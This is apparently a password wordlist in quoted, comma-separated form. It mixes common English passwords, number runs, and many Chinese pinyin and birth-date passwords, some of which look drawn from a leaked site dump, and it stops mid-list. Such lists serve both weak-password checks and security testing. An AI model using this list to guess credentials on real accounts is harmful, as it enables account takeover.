"corona","corrado","corwin","cosmos","cougar","cougars","country","courtney","cowboy","cowboys","coyote","cracker","craig","crapp","crawford","creative","cricket","crow","cruise","crystal","cuddles","curtis","cutie","cyclone","cynthia","cyrano","daddy","daisy","dakota","dallas","dan","dance","dancer","daniel","danielle","danny","darren","darwin","dasha","database","dave","david","dawn","daytek","dead","deadhead","dean","death","debbie","december","deedee","defense","deliver","delta","demo","denali","denise","dennis","denver","depeche","derek","design","detroit","deutsch","dexter","diablo","diamond","diana","diane","dickhead","digger","digital","dilbert","direct","director","dirk","disney","dixie","doc","doctor","dodger","dodgers","dog","dogbert","doggie","doggy","dollars","dolphin","dolphins","dominic","domino","don","donald","donkey","donna","doobie","doogie","dookie","doom","dorothy","doug","dougie","douglas","dragon","dream","dreamer","dreams","drizzt","drums","duck","duckie","dude","duke","dundee","dustin","dusty","dwight","dylan","e-mail","eagle","eagles","easter","eatme","eclipse","eddie","edward","eeyore","einstein","elaine","electric","elephant","elizabet","ellen","elliot","elsie","elvis","elwood","email","emily","emmitt","energy","enigma","enter","entropy","eric","espanol","etoile","eugene","europe","excalibu","except","explorer","export","express","faith","falcon","family","farmer","farming","felix","fender","ferrari","ferret","ffffff","fgh","fiction","fiona","fire","fireball","firebird","fireman","first","fish","fisher","fishing","flamingo","flash","fletch","fletcher","flight","flip","flipper","florida","flower","flowers","floyd","fluffy","flyers","foobar","fool","footbal","ford","forest","fountain","fox","foxtrot","fozzie","france","francis","francois","frank","frankie","franklin","fred","freddy","frederic","freedom","french","friday","friend","friends","frodo","frog","froggy","frogs","front","frosty","fubar","fucker","fuckme","fuckoff","fuckyou","fugazi","fun","future","gabriel","gabriell","gaby","galaxy","galileo","gambit","gandalf","garden","garfield","garlic","garnet","garrett","gary","gasman","gateway","gator","gemini","general","genesis","genius","george","georgia","gerald","german","ghost","giants","gibson","gilles","ginger","gizmo","glenn","global","go","goalie","goat","goblue","gocougs","godzilla","gofish","goforit","gold","golden","goldie","golf","golfer","golfing","gone","goober","goofy","gopher","gordon","grace","grandma","grant","graphic","grateful","gray","graymail","green","greenday","greg","gregory","gretchen","gretzky","griffey","groovy","grover","grumpy","guess","guest","guido","guinness","guitar","gunner","gymnast","h2opolo","hacker","hal","hammer","hamster","hanna","hannah","hansolo","hanson","happy","happyday","harley","harold","harrison","harry","harvey","hatton","hawaii","hawk","hawkeye","hazel","health","heart","hearts","heather","hector","heidi","helen","hell","hello","help","helpme","hendrix","henry","herbert","herman","hermes","hershey","history","hobbit","hockey","hola","holly","home","homebrew","homer","honda","honey","hoops","hootie","horizon","hornet","hornets","horse","horses","hotdog","hotrod","house","houston","howard","hunter","hunting","huskers","icecream","iceman","idiot","iguana","image","imagine","impala","indian","indiana","indigo","info","informix","insane","inside","intel","intern","ireland","irene","irish","ironman","isaac","isabelle","isis","island","italia","italy","jack","jackie","jackson","jacob","jaeger","jaguar","jake","jamaica","james","jan","jane","janice","january","japan","jared","jasmin","jasmine","jason","jasper","jazz","jean","jeanette","jeanne","jeff","jeffrey","jenifer","jenni","jennifer","jenny","jensen","jeremy","jerry","jessica","jessie","jester","jesus","jewels","jim","jimbo","jimbob","jkm","joanna","joe","joel","joey","john","johnny","johnson","jojo","joker","jonathan","jordan","joseph","josh","joshua","josie","jsbach","judith","judy","julia","julian","julie","junebug","junior","jupiter","justice","justin","karen","katherin","kathleen","kathryn","kathy","katie","kayla","keith","kelly","kelsey","kennedy","kenneth","kermit","kevin","khan","kids","killer","killme","kim","kimberly","kinder","king","kingdom","kingfish","kitten","kittens","kitty","kleenex","knicks","knight","knights","koala","koko","kombat","kramer","kristen","kristi","kristin","kristy","krystal","lacrosse","laddie","lady","ladybug","lakers","lakota","lamer","larry","larson","laser","laura","lauren","laurie","law","ledzep","lee","legend","lennon","leon","leonard","leslie","lestat","letmein","letter","library","light","lincoln","linda","lindsay","lindsey","lionking","lisa","little","liverpoo","lizard","lloyd","logan","logical","london","looney","lorraine","loser","louis","louise","love","lovely","loveme","lover","loveyou","lucas","lucky","lucy","lulu","lynn","mac","macha","macintos","maddock","maddog","madison","maggie","magic","magnum","mailer","mailman","major","majordom","malcolm","malibu","mantra","marc","marcel","marcus","margaret","maria","mariah","marie","marilyn","marina","marine","marino","mario","mariposa","mark","market","marlboro","marley","mars","marshal","martha","martin","marty","marvin","mary","maryjane","master","masters","math","matrix","matt","matthew","maurice","maveric","maverick","max","maxime","maxwell","mazda","mayday","me","medical","megan","melanie","melissa","memory","memphis","meow","mercedes","mercury","merlin","metal","metallic","mexico","michael","michel","michele","michell","michelle","mickey","micro","midnight","midori","mikael","mike","mikey","miki","miles","miller","millie","million","mimi","mindy","mine","minnie","minou","mirage","miranda","mirror","misha","mishka","mission","missy","misty","mitch","mitchell","mittens","modem","molly","molson","mom","monday","monet","money","monica","monique","monkey","monopoly","monster","montana","montreal","moocow","mookie","moomoo","moon","moose","morgan","moroni","morris","mortimer","mother","mountain","mouse","mozart","muffin","murphy","music","mustang","nancy","naomi","napoleon","nascar","nat","natasha","nathan","nautica","ncc","ne","nebraska","nellie","nelson","nemesis","nesbitt","netware","network","new","newcourt","newpass","news","newton","newuser","newyork","nguyen","nicarao","nick","nicole","niki","nikita","nimrod","niners","nirvana","nissan","nite","none","norman","nothing","notused","nss","nugget","number","nurse","oatmeal","obiwan","october","olive","oliver","olivia","olivier","one","online","open","opus","orange","oranges","orchid","orion","orlando","oscar","ou","oxford","pacers","pacific","packard","packer","packers","painter","paladin","pamela","panda","pandora","pantera","panther","papa","paris","parker","parrot","pascal","pass","passion","passwd","passwor","pat","patches","patricia","patrick","paul","paula","peace","peaches","peanut","pearl","pearljam","pebbles","pedro","peewee","peggy","penelope","penguin","penny","pentium","people","pepper","pepsi","percy","perry","pete","peter","petey","petunia","phantom","phil","philip","phillip","phish","phoenix","photo","piano","picard","picasso","pickle","picture","pierce","pierre","piglet","pinkfloy","pirate","pisces","pizza","planet","plato","play","playboy","player","players","please","pluto","pmc","poiuyt","polaris","police","politics","polo","pomme","poohbear","pookie","popcorn","popeye","porsche","porter","portland","power","ppp","praise","preston","prince","princess","prof","promethe","property","protel","psalms","psycho","public","puckett","pumpkin","punkin","puppies","puppy","puppy123","purple","pyramid","python","quality","quebec","quest","qwaszx","qwert","rabbit","racerx","rachel","racing","racoon","radio","raider","raiders","rain","rainbow","raistlin","rambo","random","randy","ranger","raptor","raquel","rascal","rasta","raven","raymond","reader","reading","reality","rebecca","rebels","red","reddog","redrum","redskin","redwing","reebok","reefer","reggie","remember","renee","republic","research","retard","reynolds","reznor","rhonda","richard","ricky","ripper","river","robbie","robert","robin","robinhoo","robotech","rock","rocket","rocky","rodman","roger","roman","ronald","rooster","roping","rose","rosebud","roses","rosie","roxy","roy","royal","royals","ruby","rufus","rugby","runner","running","russel","russell","rusty","ruth","rux","ruy","ryan","sabrina","sadie","safety","sailing","sailor","sales","sally","salmon","salut","sam","samantha","sammie","sammy","sampler","sampson","samson","samuel","sanders","sandra","sandy","sango","santa","sapphire","sarah","sasha","saskia","sassy","saturn","savage","sbdc","scarlet","scarlett","school","science","scooby","scooter","scorpio","scorpion","scotch","scott","scotty","scout","scruffy","scuba","sean","seattle","secret","security","sendit","senior","septembe","sergei","service","seven","sexy","shadow","shadows","shalom","shannon","shanti","shark","sharon","shawn","sheba","sheena","sheila","shelby","shelley","shelly","sherry","shirley","shit","shithead","shoes","shooter","shorty","shotgun","sidney","sierra","silver","simba","simon","simple","singer","skater","skeeter","skidoo","skiing","skinny","skipper","skippy","slacker","slayer","smashing","smile","smiles","smiley","smiths","smokey","snake","snapple","snicker","snickers","sniper","snoopdog","snoopy","snow","snowbal","snowman","snuffy","soccer","softball","soleil","sonics","sonny","sophie","space","spain","spanish","spanky","sparky","sparrow","special","speech","speedo","speedy","spencer","spider","spike","spirit","spitfire","spooky","sports","spring","sprite","spunky","squirt","ssssss","stacey","stanley","star","stargate","start","startrek","starwars","station","stealth","steele","steelers","stella","steph","stephani","stephen","steve","steven","stever","stimpy","sting","stingray","stinky","storm","stormy","strat","strawber","strider","stuart","student","studly","stupid","success","sugar","summer","sun","sunbird","sundance","sunday","sunflowe","sunny","sunrise","sunset","sunshin","super","support","supra","surf","surfer","susan","suzanne","suzuki","sweetie","sweetpea","sweets","sweety","swimmer","swimming","sydney","sylvia","sylvie","symbol","system","t-bone","tacobell","taffy","tamara","tammy","tandy","tango","tanker","tanner","tanya","tara","tardis","target","tarzan","tasha","tattoo","taurus","taylor","tazman","teacher","teachers","tech","techno","teddy","telecom","temp","temporal","tennis","tequila","teresa","terry","test","test123","tester","testing","texas","theatre","theboss","theking","theman","theresa","thomas","thumper","thunder","thunderb","thursday","thx","tiffany","tiger","tigers","tigger","tigre","tim","timber","time","timothy","tina","tinker","tinman","tintin","toby","today","tom","tomcat","tommy","tony","tootsie","topcat","topgun","topher","toronto","toyota","tractor","tracy","training","travel","travis","trebor","trek","trevor","tricia","trident","tristan","trixie","trouble","truck","trucks","trumpet","tucker","tuesday","turbo","turtle","tweety","twins","tyler","undead","unicorn","user1","utopia","vader","valentin","valerie","valhalla","vampire","vanessa","vanilla","velvet","venus","vermont","veronica","vette","vicky","victor","victoria","victory","video","viking","vikings","vincent","violet","viper","virginia","visa","vision","volley","volleyb","volvo","voodoo","voyager","walker","walleye","wally","walter","wanker","warcraft","warez","warner","warren","warrior","warriors","water","watson","wayne","weasel","webmaste","webster","weezer","welcome","wendy","wesley","western","whales","whateve","whatever","wheeling","wheels","whisky","white","whitney","wicked","wilbur","wildcat","william","williams","willie","willow","willy","wilson","win95","win98","win2000","win2k","windows","windsurf","winner","winnie","winnt","winston","winter","wisdom","wizard","wolf","wolfgang","wolfman","wolverin","wolves","wombat","wonder","woodland","woody","wqsb","wrangler","wrestle","wright","wwwwww","xanadu","xavier","xcountry","xfiles","xxx","xxxx","xxxxxx","yamaha","yankees","yellow","yoda","yomama","young","yvonne","zachary","zapata","zaphod","zebra","zenith","zephyr","zeppelin","zeus","ziggy","zombie","zorro","zxcvb","zzzzzz","cpu","memory","disk","soft","y2k","software","cdrom","rom","master","card","pci","lock","ascii","knight","creative","modem","intranet","web","www","isp","unlock","ftp","telnet","ibm","intel","dell","compaq","toshiba","acer","info","aol","56k","server","dos","windows","win95","win98","office","word","excel","access","unix","linux","file","program","mp3","mpeg","jpeg","gif","bmp","billgates","chip","silicon","sony","link","word97","office97","network","ram","sun","yahoo","excite","hotmail","yeah","sina","pcweek","mac","apple","robot","key","monitor","win2000","office2000","word2000","net","virus","company","tech","technology","print","coolweb","guest","printer","hotpage","enter","myweb","cool","coolman","coolboy","coolgirl","netboy","netgirl","log","connect","email","hyperlink","url","hotweb","java","cgi","html","htm","home","homepage","icq","mykey","c++","basic","delphi","pascal","anonymous","crack","hack","hacker","chinese","vcd","chat","chatroom","mud","cracker","happy","hello","room","english","user","netizen","frontpage","agp","netwolf","usa","hot","site","address","mail","news","topcool","000","0000","001","002","007","008","10th","1st","2nd","3rd","4th","5th","6th","7th","8th","9th","100","101","108","133","163","166","188","233","266","350","366","450","466","136","137","138","139","158","168","169","192","198","200","222","233","234","258","288","300","301","333","345","388","400","433","456","458","500","555","558","588","600","666","598","668","678","688","888","988","999","1088","1100","1188","1288","1388","1588","1688","1888","1949","1959","1960","1961","1962","1963","1964","1965","1966","1967","1968","1969","1970","1971","1972","1973","1974","1975","1976","1977","1978","1979","1980","1981","1982","1983","1984","1985","1986","1987","1988","1989","1990","1997","1999","2000","2001","2002","2088","2100","2188","2345","2588","3000","3721","3888","4567","4728","5555","5678","5888","6666","6688","6789","6888","7788","8888","8899","9988","9999","23456","34567","45678","54321","88888","6666","56789","737","777","1111","2222","3333","4321","1Q2W3E4R5T","wojiushiwo","123456qwe","as123456","q1w2e3r4t5","wang123456","zz123456","hahahaHA","qqqqqqqqqq","Woailaopo","123456ABCD","1234ASDF","Q12345678","zx123456","HHHHHHHH","1111aaaa","woainiwoaini","abc12345678","12345678q","1qaz@wsx","Aa111111","Q11111111","ASDFZXCV","12345abc","123QWEASDZXC","123456ASDF","ZHANGHUI","Haohaoxuexi","POIUYTREWQ","tttttttt","LIUQIANG","FANGFANG","qingqing","123456789QQ","qaz12345","CAONIMA123","yu123456","QIANQIAN","LKJHGFDSA","QQQ123456","aaaa1234","zhangliang","zzzzzzzzzz","XUANXUAN","wangshuai","WOSHINIBA","PASSWORD123","WANGHUAN","zhangming","password1","kangkang","QQ1234567","Abc112233","ABCabc123","521224727","19831115","c123456789","19821228","19840203","19860216","19870807","78945612","15151515","19870830","19880927","19840601","19890323","19870705","19891210","zhangfeng","11223300","fighting","19841009","19870522","asd123456789","159357258","19860523","tongtong","19840210","19870922","pok29q6666","12345678.","19831207","asd147258","13800138000","19851207","19870822","19890215","19860808","19851206","19881007","19870610","19860215","8008208820","19891014","19880223","19870223","19870418","19880103","5201314qq","19891129","19891220","19870126","wangchen","19811018","19880303","19871113","19880922","19890927","19831116","19880510","19841128","0.0.0.0.","19850925","19880610","19851004","nishiwode","songaideng","19870404","19870529","aa000000","19880128","chenjing","19860910","dirdirdir","19811001","19840808","19880309","19891113","19881222","19860410","19841209","19870127","19880105","19860810","19860329","windows98","19811225","19880205","19870315","19871231","19891101","19880818","19831110","woshihaoren","yongheng","19850823","19870412","19870419","19890826","19870929","19860725","19880611","123456ll","19830205","19881231","19870715","19820911","19811020","19860208","19850927","19831006","101101101","11211121","12342234","134679258","juventus","19870814","19880909","love123456","19811022","19860312","19821214","19840204","19880102","1472583690","19870324","19860619","linrk520","16161616","19880920","19860906","19860626","fdsafdsa","19870829","xu123456","123456789l","19860918","19191919","19870901","80808080","19841216","19870304","19821103","woaini11","19860205","19860512","19890212","123456789asd","19870402","19891119","chenyang","pass1234","19890910","19860118","19870226","1234560.","19860325","tiantang","a7758258","19870908","19860815","19880701","19880207","19890120","AAAAAAAAAAAAAAAAAAAA","hu123456","19821119","19860219","19821204","zf526546543","19830218","19850124","19890919","19890216","19880302","19821229","19890920","19811216","tomorrow","dangyuan","19880820","19801020","54181452","19820812","19890123","19891109","19811013","130130130","19891231","19850214","19811014","19820808","19860623","19891208","19860203","19870504","19840929","19870817","19870813","19870725","goodgood","19870306","zhu123456","19870110","19870410","19821201","19870910","19890213","cet333333","19841223","19881105","19860824","19880612","19860104","19841112","19870328","19851202","147852963","19821111","19841109","19880916","19891202","19870106","19860823","19841110","19841227","123456pp","19821109","19851108","19870924","19870316","22446688","19880829","69696969","19890828","19890310","19821009","19860226","19840928","19880419","19850917","wei123456","19880628","19820918","19830926","44556677","19870204","19880813","19840909","19870826","19831005","19820909","19850412","19830928","liang123","19870417","19880216","19881207","32323232","19860715","19860318","19821202","hh123456","19870411","china123","19840216","19890314","19870923wex","zxc123123","19830815","19880313","14159265","Password01!","789123456","19880508","19890316","19851103","abcdabcd","qwer123456","19850820","qazxsw123","19880720","741741741","19821127","19860106","19870312","19870613","19870905","19870523","19801212","19831202","19870501","19850825","19870115","19880520","19870421","19880709","19880129","19870320","19901025","19870727","19840207","19880210","19891112","19890312","123456liu","xy123456","19860401","19860724","19870219","19880722","19850815","wanglong","19890103","19860829","19830101","19880427","19891118","19840815","19880201","jisuanji","19890129","19890110","by7704566","19880910","jiangtao","19860919","19881230","chengcheng","123456++","19880204","19840924","19891103","19850808","19860311","19870902","19870906","19880618","19850622","19870524","19850303","19820928","123456li","28845452884545","19891223","123456TT","19841201","hao456250","19820214","19821105","11001100","19890415","19891207","tt123456","cyq721225","19811981","19880104","19821117","19831117","19870122","19831209","19860306","19831109","zhanglin","19890124","19870311","19831203","77887788","19860914","9876543211","aassddff","19841202","19880923","19890912","19860805","19880918","19860712","19850115","19811021","19870416","19880517","19860108","19881104","jiajiajia","19870105","19870719","19860822","19841104","198019803014166","19880911","19890924","19880516","19860122","zc123456","19891230","19821005","19870816","qqwweerr","19891106","19811015","y123456789","19880707","zhangjin","jordan23","maomaomao","19841118","19870721","19890203","wangyuan","zxcvbnmz","19880306","19820502","19840902","1314520a","19860310","19830302","wj123456","19860204","19801225","19840918","19870712","19890618","jiushiwo","123456yy","19860904","123123..","147369258","19880420","chenming","19870124","19820818","19860825","19870313","19881009","19840312","woshiren","jiandanai","19860826","654321654321","windows2000","a1a1a1a1","19820816","19890504","huanghuang","liujianliu","123qazWSX","19880917","19860505","19811108","12345qwe","80238023","19860520","19860812","wangxiao","19850912","MINGTIAN","1234567890a","zhanghua","19891205","19870114","19860116","19811024","19831104","112233112233","19840923","wangping","19880229","19880318","zhenzhen","19880115","19840906","19890125","19880122","19880814","19880723","741236985","19871031","11231123","19880613","yangyong","3333333333","19870716","19880506","66669999","a123456b","123456781","19860209","ningning","19860928","shuaishuai","woainiya","19820915","19870724","19850822","19880324","19880127","15935700","19860605","19880106","19850216","19880801","19880609","19850415","19860818","19890823","19811218","19880624","19860901","zhangfan","19830124","19811121","laopo520","19870827","19850121","19870116","19860124","1314520123","jiok98001","xiaoliang","19850924","19821231","19870804","19870729","********","19821007","19890218","19870714","19811128","19840205","19831017","zhangrui","19880608","19880501","142857142857","26262626","password888","5201314..","19891126","sz123456","19850211","zhouyang","19860420","20012001","19870505","19880708","19880925","19840822","m123456789","19831031","19870803","1234567890.","19811016","19880224","19861231","19831114","19870415","19880715","19820925","azsxdcfv","19870307","19880805","123asd123","19850220","19880421","19811029","shevchenko","19830505","19891117","19870809","happyboy","51515151","19870518","wwwwwwwww","19890308","19811212","42011178","19880711","19891214","19880912","19830215","Lj123456","19841207","19850914","19811115","19840201","19880208","19860320","19890628","19880518","19870130","kobebryant","19860105","19840310","123456qwer","19891229","163163163","19820917","19820926","iamthebest","zl123456","m12315309","woshinibaba","19880325","dangerous","19860615","19890128","19890815","19880617","19880116","19860913","19850212","19890116","vvvvvvvv","19850902","52013144","19820822","110112119","19860218","19850621","happy12345","19821222","zhoujian","19870314","000111222","19880408","19860220","diandian","132465798","19830623","19870302","19890127","19870517","ok123456","19830916","19860922","yongyuan","19880826","jiangjun","0147896325","19850922","19860601","huangjian","38183818","20082009","19891108","19891227","19880626","zhangqian","213213213","windows1","19880109","19890303","60200946","19821125","19890916","19860302","19831222","19840606","19870607","19831223","19880110","bb123456","19840315","19830629","19890102","19880511","19880220","96321478","19860719","19830102","19850125","123000000","175638080","gameover","xiao123456","19850928","19860223","19890126","19870513","19850410","19880418","19880301","19870322","19880226","womendeai","19850623","zzz123456","19880320","19860123","19880903","19870526","19891111","jiangjiang","19840127","19830624","19860903","19811019","zhaoyang","19860806","chenzhen","19801012","19820930","qq112233","19830210","nnnnnnnn","19831119","19891209","19871130","asdasdasdasd","wangqing","19891107","19870703","19880525","sdfsdfsdf","09308066","178678789","19850510","19880806","19880305","19880321","15975300","19880406","19880907","19890405","sd123456","a147258369","19820413","19870802","19811011","A1234567890","19820809","19870512","19860206","19850701","19880314","zxcvbnm,","19890202","woshi123","12312345","19850310","123456cc","5418854188","19860701","10231023","19811123","chenlong","19880114","19801220","19880213","zhouazhou","19870711","19880629","19860602","19880822","19840915","19890813","Hellokitty","qkvpoia569","19870723","19820913","19840202","19890923","19831229","12345698","19870806","zhongnan","19821209","19831107","19851009","19870408","xiaofang","19840801","19820927","19850601","QQ7758521","19890909","19890221","19831030","19821003","19870516","19860614","19880924","wangting","007008009","aaaabbbb","20042004","19830714","jb85811510","19841117","19840123","79797979","44332211","mima123456","20072007","19891003","19840404","19840218","19801226","19840106","zhuzhuzhu","welcome1","zhangyue","19840220","19860616","19870104","19820124","19880810","19880603","19830925","19890319","19870427","19870329","19880929","19840311","19870530","19870406","19890107","19891102","19850727","19821203","19891222","19880811","19840920","19870323","19860506","19830327","12211221","zhanglong","19831002","19870509","19850725","19860708","19890901","312312312","19860707","19880423","19891115","19830929","19791001","52525252","19820828","135135135","99990000","19880724","00000000000","19880802","19850110","19850929","19850910","19880702","mm108428","19860809","qazxcvbnm","zhanghong","123456mm","19880919","dongfang","334205265","19880315","javascript","123QWERT","19890315","19880625","60729043","19890106","19880119","19830612","19880412","19860624","19850120","19890119","zhangzhen","19830922","19841106","19850204","123456kk","19891005","19890606","19860521","19870318","19890829","19820707","19870118","19870710","19850908","19841231","19820914","19820921","19880721","19830913","19860720","19811125","19801215","999888777","19860213","19860415","19860402","19860607","asdf12345","314159314159","xiaoxiong","jj123456","19870319","1qazzaq1","19880221","feifeifei","19860113","zj123456","19841222","19860201","19850618","19850107","19860416","19890801","19901010","19870713","19870718","yaho982er","19860710","19880902","19850626","19830521","19880728","19840612","21882188","19880605","19850828","19820318","512512512","19830918","19850726","xiaotian","19891105","19870222","wl123456","a5211314","19890612","654654654","123456520","19880219","19890925","19880415","19830213","19850301","19880411","123qwe123qwe","19820910","19830901","WASDWASD","52113141314","19840820","juanjuan","19860527","19860920","wodezuiai","19880825","19891217","nsnsnsns99","WOAIZIJI","19860304","weblogic","19820826","19860501","19811027","55558888","19860408","19850224","ddzj39cd9","11259375","cn835312","19870425","891023hh","19890114","19870519","19820916","19850911","19880529","110120110","huanglei","19880505","19860722","19890825","wq123456","19890601","19880714","12345678z","19890209","19901023","19811012","19850219","52571314","19880729","19830113","19870401","19890928","19880622","19860522","19870131","19881031","19890616","19850502","19870107","76543210","19840302","19870511","19830203","167669123","19890604","19840713","19850501","19850614","19880904","19890404","19850611","19860828","19870108","19880726","19840326","19870502","abwdxwtz","19890808","caonimama","19830201","19890918","630158513","passport","love5201314","19890305","woxihuanni","19880304","19870630","19840901","19890816","19820912","19860326","19820902","x12345678","19860403","19840303","19880615","19850608","chenggong","12365400","19840305","19860107","19890624","nopassword","19880906","19811127","19890520","19890821","19850104","wowangle","19891004","19860612","zhou123456","hongkong","19850202","19850801","guaiguai","19821223","000000000000","19811129","19850805","10293847","19880227","wangbadan","19880817","19880405","19850123","clens21563sf","666888999","qwertasdfg","19870428","19841031","19890220","19890626","19870309","19860109","19840116","456852123","yangming","19870805","wy123456","19850314","19890526","19870424","19870720","52113140","19860721","1234560123","19811124","bakhn524d","19830923","19860319","admin12345","52101314","19890915","19840829","19880225","19870726","13579246810","19811023","19880819","19860112","19880425","16899199","19831231","19890607","19890812","19840215","chaochao","19840124","19880512","19850126","zaqwsx123","p0o9i8u7","19880718","19891008","19850217","19821031","showmethe","19860207","19820309","142536789","19870812","19860307","19850420","19830919","ms0123456","19860518","19860428","19870409","19860114","19811120","ilovecsdn","19811203","whbs2234","19830310","19890921","zhangmin","19840810","19840229","19880117","19850312","19860801","19811223","19850103","19821114","10201020","19851130","19820208","19890311","19811210","19850903","19860802","19891007","19880528","19820415","jianghui","19860418","19860709","19880524","shengyulan","19890501","19860514","19840728","19860406","19820216","zhangshuai","19850920","19840828","19820620","19820619","19880530","19880908","19820210","5201314aa","19860115","2010comer","19860821","passpass","19890926","weishenme","19830313","19830801","19840212","19840110","19840615","456123123","19870706","546546546","123654123654","19880327","19850721","19870510","19880329","z3261678","mamawoaini","87878787","19890211","19801025","19850129","19880913","19811215","19890113","19840217","19860621","520090025hgb","19890503","zxc12345","19860110","19801208","19890613","19880620","19821110","19860305","19890811","19870413","19850116","46709394","qazwsxqaz","19880107","19840712","menghuan","19830721","51211314","19830601","qaz123wsx","201201201","19860817","19850109","19870224","19890820","19830312","19891031","19811213","19860317","wangcheng","19840424","58451201314","19870317","19840807","19860417","19860813","19890204","135781012","14725836","96969696","0102030405","19801112","qaz123123","1314520.","19890105","19860412","19860728","19860714","19850821","19880526","19830909","19820202","lovemyself","19850326","19890222","123123aaa","19860819","19820103","19820529","zhanshen","19880504","19890413","20002000","19820425","19820618","19801213","19850320","zh123456","19830810","1314521521","wangqian","zhaojing","753951753951","19880308","19840208","19880426","DD123456","youandme","5201314789","19890307","aa123321","19890619","19850322","long123456","19880914","19880725","19820219","19880404","wohenhao","19860611","19861130","19840809","19820217","capslock","lavender","19901020","19840225","19870709","19840209","axs8873w","19830621","210210210","19840813","19890824","19850210","19850918","19830713","19811226","19840501","20032003","ws123456","19850128","19841114","19820801","19880803","19890418","918918918","110119110","12131213","19850723","mypassword","19850218","19870321","70701111","19821004","niaiwoma","19850302","19850916","1887415157","zhaozhao","13093313856","19890320","19820422","19850826","x1234567","19840421","19861031","19840811","xiaoying","shoujiqb","19880616","19860308","pp123456","19850707","19880621","h1234567","0000....","19890208","liuchang","huang123456","19860421","19850209","456123456123","19840526","123456abcdef","19850305","19840911","19890327","08080808","19850807","19831130","19860608","250250250","liuliang","19890625","lilingjie1102","74123698","19860618","19820827","19801123","123456789o","19860127","19811217","19850824","o0o0o0o0","211211211","asdasd33","19890508","19850425","159951159","19850226","19850525","38383838","19880812","19890525","77585200","19870405","19870429","19840610","19840629","verygood","19830921","19850108","19820512","19850613","19880113","19860908","19890605","caonimade","19901022","19830219","ihateyou","19890707","19850112","19801124","19850221","19890412","hld_1209","19821108","zaq123456","19890615","77582587758258","19870702","19840414","19870327","19811116","19880830","19860321","19840824","19840510","1234509876","123321qq","19840504","123123abc","19811228","17051974","zaqwsxZXC","19820626","19811221","19860717","19840725","19860504","fuckfuck","19850625","19860419","523523523","19801010","zhonghua","19820315","mengxiang","19840821","19860422","aaa12345","19811230","19850304","19850315","19890219","19820829","c1234567","samleiming","19811231","19801120","19840711","19840104","19830625","19850127","19771105","19830906","jdheh421","wangbing","52331314","zxcvbnmasd","19890603","19890710","19880804","19860610","19890715","12300123","laopowoaini","19820115","19811104","alexander","19831004","19870422","19891114","19860301","19820325","19820410","19820920","19860414","wangxiang","19820127","19890321","19840721","19880402","19830820","19840720","opendoor","19821107","19850606","19890115","19830103","19860811","19860129","19830303","19890623","19830823","19850919","19890803","19880515","cnforyou","19801230","19830306","19901018","19880604","19850207","19860426","zhangnan","19890411","autoexec","258369147","12345asdfg","19830226","19880401","19781978","CHOCOLATE","19840228","19801014","19830211","19890712","19970701","19880330","19820606","19820723","19820714","19840405","Asdfghjkl;'","19830126","19840818","19890329","10251025","951753951753","19890914","zhangheng","19830307","19840919","19840814","19880319","19880727","19860513","19820119","19880130","19850609","19880513","19840226","19850317","zhangyuan","19860705","19840409","159258357","yskj33333","520123456","19860510","19880710","1008610086","19880602","19830520","19820601","19850724","19860905","gao123456","19820408","19890117","19990125","19830701","19820312","19850612","19801228","jiarenqb","19860224","19850624","17171717","19830911","19880519","19811112","12312311","shenyang","19840614","19870423","19860603","accpaccp","Q123123123","xiaopeng","19840105","5845131421","19890130","19870722","19850523","19820905","19740302","34416912","19840506","xiaoyuer","19840626","19890722","19870227","10011001","19840625","111111aaa","19830110","wang1987","19870109","19820701","19850205","149162536","19840130","honghong","lalalala","19880422","19890420","19860629","19890425","19840723","19830513","ainiyiwannian","lililili","z1231231","123000123","19870119","3344556677","19820203","19811219","19890416","19880627","19870308","110220330","5201314000","19860529","96111111","19850520","12481632","19860723","19890210","19840126","mima1234","19840904","19820720","19840927","19850122","19820821","19801121","19840227","19880112","19870528","11118888","19810101","7410852963","19860405","19890302","19840213","delphi2009","huiyuanai","19860620","seoshiyan","19811105","19870717","19850228","19810323","124578963","19830120","19840416","19840706","aaaAAA111","19820922","19840605","19830510","19820416","19890410","19850628","19830606","asdfasdfasdf","19880824","19840410","19890620","19870515","19821206","19840117","19880623","19811111","19850325","19820711","19820817","19880503","19820802","126126126","19830626","19880317","qiujingni","19820316","wangzheng","551648586","19880905","19890324","19820304","zw123456","1234zxcv","a1a2a3a4","19860327","211314211314","zaqwsxcde","19890318","19820807","zhangning","19900101","19820924","123456az","19840702","19860718","19890104","19880614","19890929","qqqqqqqqqqqqqqqqqqqq","45874587","LUO123456","19850206","19820810","fksdde7039","19880521","19811224","19850816","19830726","wwwwwwwwww","19820418","19890719","19860729","19830106","19840219","19840309","m1234567","117117117","19820123","20090101","19890614","19890709","19820401","19840505","wohenaini","huanying","520fagnsg","19830808","19820417","19850913","19830222","zaq12345","19890817","19830910","19840122","19820919","19811214","19890701","123456789x","19830206","harrypotter","19840917","19850720","951753852","562059487","19830323","19840520","19890108","sunyanzi","19890109","19901015","baobao520","112233123","314314314","19811101","19880730","19821227","19840912","5211314a","19891009","19890304","19860907","19840119","123qweqwe","19880514","zhangwen","sdsdsdsd","gaoxiang","19820813","19890313","19891203","zhangkun","123456sa","19820412","19830817","zhang1987","19820903","guoliang","19880502","aa112233","kingsoft","444444444","19860716","19880823","congcong","19840910","19850818","19820929","19810201","19860706","19850819","19840329","19830515","zsj201006","19900504","19890805","asdfghjkl123","111111121","ingtake1","19820211","19801016","112244abc","mimacuowu","19820906","100200100","h12345678","19850309","19880704","19880827","sasasasa","19870111","q5201314","31415927","19840304","xinxin13d","19820825","19890112","19820201","19840121","123456789m","1236547890","19890326","19880316","19860516","zoo-1573","abcdef123","19860411","19811007","bbscsdnnet","19890317","19830315","19850827","a89400ab","caocaocao","19800101","songyang","19860227","10121012","19850318","19850804","19890830","19890705","19811204","19850106","19880111","320320320","bai18dudu","19811109","zaglylc369","19890325","19850722","19801028","19801210","19840604","19880706","19901016","xz123456","wltg2010","12345ssdlh","19860316","19860324","poiuytre","qwaszx123","07231564","0340412124abcd","19860702","19860515","19820107","19870330","19891204","19901024","19870420","19811126","19820617","liu12345","19820120","19820102","19820721","19890111","19840913","19810909","19860726","138138138","321456987","112233aa","19860117","19840726","19840512","qazwsx123456","19850114","19820823","19820923","19850223","110119110119","19840528","19860915","00001234","19850504","30303030","19830220","51888888","19860830","19840527","19890322","19890510","shenzhen","1h2h2h3h4h","ad123456","superstar","xiaoyong","158158158","19850201","nihaoma123","19880821","chengang","19850513","19811008","19890906","qwer4321","19820306","19840825","02020202","MOTOROLA","19830414","19840908","19850901","113113113","19810929","19820204","a123123a","19820114","19860509","19811122","19830725","19830316","19830114","19860804","chendong","19850506","19890725","19880713","85858585","19860711","19830425","19850421","12151215","19840701","qwerty12","19850529","19830814","198